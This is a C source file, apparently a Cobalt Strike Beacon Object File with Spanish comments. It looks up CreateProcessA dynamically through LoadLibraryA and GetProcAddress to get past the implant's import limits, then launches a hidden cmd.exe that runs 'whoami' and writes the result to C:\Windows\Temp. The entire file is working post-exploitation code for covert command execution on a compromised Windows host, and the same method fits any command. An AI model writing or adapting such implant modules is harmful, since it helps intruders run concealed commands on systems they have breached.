#include <windows.h>
#include "beacon.h"

// Necesitamos CreateProcessA — ¡pero no está en tu tabla!
// → SOLUCIÓN: Usamos LoadLibraryA + GetProcAddress para obtenerlo dinámicamente

extern PVOID __imp_LoadLibraryA;
extern PVOID __imp_GetProcAddress;
extern PVOID __imp_CloseHandle;

typedef BOOL (WINAPI *CREATEPROCESSA)(
    LPCSTR lpApplicationName,
    LPSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCSTR lpCurrentDirectory,
    LPSTARTUPINFOA lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
);

void go(char *args, int alen) {
    HMODULE hKernel32 = (HMODULE)((HMODULE(WINAPI*)(LPCSTR))__imp_LoadLibraryA)("kernel32.dll");
    if (!hKernel32) {
        BeaconPrintf(CALLBACK_ERROR, "LoadLibraryA(kernel32.dll) falló\n");
        return;
    }

    CREATEPROCESSA pCreateProcessA = (CREATEPROCESSA)((FARPROC(WINAPI*)(HMODULE,LPCSTR))__imp_GetProcAddress)(
        hKernel32, "CreateProcessA");
    if (!pCreateProcessA) {
        BeaconPrintf(CALLBACK_ERROR, "GetProcAddress(CreateProcessA) falló\n");
        return;
    }

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // ¡Ventana oculta!

    char cmd[] = "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt";

    if (!pCreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        BeaconPrintf(CALLBACK_ERROR, "CreateProcessA falló\n");
        return;
    }


    ((BOOL(WINAPI*)(HANDLE))__imp_CloseHandle)(pi.hProcess);
    ((BOOL(WINAPI*)(HANDLE))__imp_CloseHandle)(pi.hThread);

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Proceso oculto ejecutado: 'whoami' → C:\\Windows\\Temp\\whoami.txt\n");
}
